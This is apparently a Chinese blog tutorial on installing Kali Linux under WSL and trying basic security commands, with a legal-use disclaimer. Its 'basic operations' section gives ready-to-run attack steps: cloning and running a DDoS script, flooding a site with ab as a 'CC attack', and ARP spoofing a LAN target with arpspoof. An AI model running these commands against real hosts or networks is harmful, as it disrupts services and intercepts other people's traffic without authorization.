







> 
> 😏*★,°*:.☆(￣▽￣)/$:*.°★* 😏  
>  这篇文章主要介绍WSL安装Kali及基本操作。  
>  **学其所用，用其所学。——梁启超**  
>  欢迎来到我的博客，一起学习，共同进步。  
>  喜欢的朋友可以关注一下，下次更新不迷路🥞
> 
> 
> 




#### 文章目录


* + [:smirk:1. Kali-Linux介绍](#smirk1_KaliLinux_7)
	+ [:blush:2. 环境安装与配置](#blush2__21)
	+ [:satisfied:3. 基本操作](#satisfied3__47)
	+ - [查看网络设备](#_48)
		- [查看网站信息](#_63)
		- [DDos攻击](#DDos_76)
		- [CC攻击](#CC_87)
		- [ARP欺骗](#ARP_96)
	+ [:satisfied:4. 渗透测试学习](#satisfied4__108)




### 😏1. Kali-Linux介绍


官网：`https://www.kali.org/`


`Kali Linux`是一款基于`Debian`的Linux发行版，旨在为渗透测试和网络安全领域提供全面的工具集合。它是由Offensive Security团队开发和维护的，专门用于渗透测试、漏洞评估和数字取证等任务。


`Kali Linux`内置了大量的安全工具和软件包，涵盖了各种渗透测试和网络攻防领域的需求。其中包括信息收集工具、漏洞扫描器、密码破解工具、无线网络工具、社会工程学工具、数字取证工具等等。这些工具的使用使得Kali成为了安全专业人员、网络管理员和渗透测试人员的`首选操作系统`。


除了强大的工具集合外，Kali还提供了一个友好的用户界面和易于使用的命令行界面，以满足不同用户的需求。它被广泛应用于安全评估、网络渗透测试、漏洞研究、恶意代码分析等领域。


值得注意的是，`Kali Linux`是一款专业的工具，仅用于合法的安全测试和授权的活动。非法使用这些工具可能会触犯法律或侵犯他人的隐私权，因此在使用Kali之前，请确保遵守适用的法律法规。


渗透测试流程：收集信息、漏洞扫描、渗透测试（查找漏洞）。


**敲重点：只是学习使用！学习使用！学习使用！**


### 😊2. 环境安装与配置


可以选择安装纯Kali Linux系统，或者用VMware等安装虚拟机系统，或者跟着本文来安装`WSL`系统。


WSL的基本操作可参考上一篇：`http://t.csdnimg.cn/monkk`


下面在WSL上安装`Kali Linux`：



```
# 打开windows terminal终端，先用wsl -l查看已安装的发行版
wsl --install -d kali-linux

```

安装成功后如下：


![在这里插入图片描述](https://img-blog.csdnimg.cn/7a28c5f4743646fd8b68b0c111695a7b.png)


更换国内源：



```
# 打开源文件
sudo nano /etc/apt/sources.list
# 注释原来的源，替换成下面的
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
# 更新
sudo apt update

```

### 😆3. 基本操作


#### 查看网络设备



```
# 了解OSI网络模型挺重要
# ping获取目标主机是否alive
ping baidu.com
# traceroute追踪数据包的路径并检测网络中的节点
traceroute baidu.com
# arp地址解析协议是将32位的IP地址转为48位的物理地址（MAC）
sudo arping 192.168.1.x -c 1
# netdiscover是一款用于网络发现和主机扫描的开源工具，用于在本地网络中快速查找并显示活动主机的IP地址和MAC地址
sudo netdiscover -i eth0 -r 192.168.1.1 （主动）
sudo netdiscover -p （被动）

```

#### 查看网站信息



```
# 网络空间测绘
# 端口扫描
nmap 192.168.0.1
# 子域名
z.zcjun.com
# 查看域名
whois baidu.com
# 查看网站内容/CMS指纹识别
whatweb baidu.com

```

#### DDos攻击



```
# 下载py代码
git clone https://github.com/Andysun06/ddos
cd ddos
# 根据python版本选择
python2 ddos-p2.py
python3 ddos-p3.py
# 可以用自己博客的地址和端口进行测试，实际类似于不断向某一地址发送非法请求

```

#### CC攻击


可以在Kali Linux上使用`ab`命令进行基准测试和性能测量，以评估Web服务器的性能和负载能力。



```
# 安装
sudo apt install apache2-utils
# ab -n 参数1（并发数） -c 参数2（发送总量） 网站地址
ab -n 1000 -c 10 网站地址

```

#### ARP欺骗


ARP欺骗（`ARP spoofing`）是一种网络攻击技术，用于在局域网中篡改或伪造网络设备之间的ARP（地址解析协议）表项，从而实现网络流量的劫持、欺骗或监听。



```
# 安装
sudo apt install dsniff fping
# 嗅探所在WLAN下所有设备的IP地址
fping -g 本机IP地址/24
# arpspoof -i 网卡名称 -t 攻击目标的IP地址 攻击目标的网关地址，如
arpspoof -i eth0 -t 192.168.0.118 192.168.0.1

```

### 😆4. 渗透测试学习


渗透测试是评估系统、应用程序或网络的安全性的过程。一般的渗透测试流程：



> 
> 1.信息收集：收集目标系统或网络的相关信息，包括IP地址、域名、子域名、网络拓扑等。
> 
> 
> 



> 
> 2.目标识别：确定要针对的具体目标，例如特定的服务器、应用程序或数据库。
> 
> 
> 



> 
> 3.漏洞扫描：使用自动化工具（如Nmap、OpenVAS、Nessus等）执行端口扫描和漏洞扫描，以发现可能存在的安全漏洞。
> 
> 
> 



> 
> 4.漏洞利用：利用已发现的漏洞，尝试入侵系统或获取未授权访问。这可能涉及到使用已知的攻击向量、开发自定义脚本或利用零日漏洞。
> 
> 
> 



> 
> 5.权限提升：在成功入侵系统后，寻找提升权限的方法，以获取更高级别的访问权，例如管理员权限。
> 
> 
> 



> 
> 6.持久性维持：确保入侵者可以保持长期访问目标系统，通常通过植入后门、创建隐藏用户账户或配置远程访问工具等方式实现。
> 
> 
> 



> 
> 7.数据收集：获取目标系统上的敏感信息，例如用户凭据、数据库中的数据或关键文件。
> 
> 
> 



> 
> 8.覆盖踪迹：删除、修改或隐藏入侵行为的痕迹，以避免被发现。
> 
> 
> 



> 
> 9.安全报告：整理渗透测试的结果和发现的漏洞，并编写详细的报告，包括建议的修复措施和加强安全性的建议。
> 
> 
> 


常用的漏洞公布网站：



```
https://www.cnvd.org.cn/
https://cve.mitre.org/
https://packetstormsecurity.com/

```

![请添加图片描述](https://img-blog.csdnimg.cn/5ea93bb657184b9eb8515cc76047c16a.png)


以上。





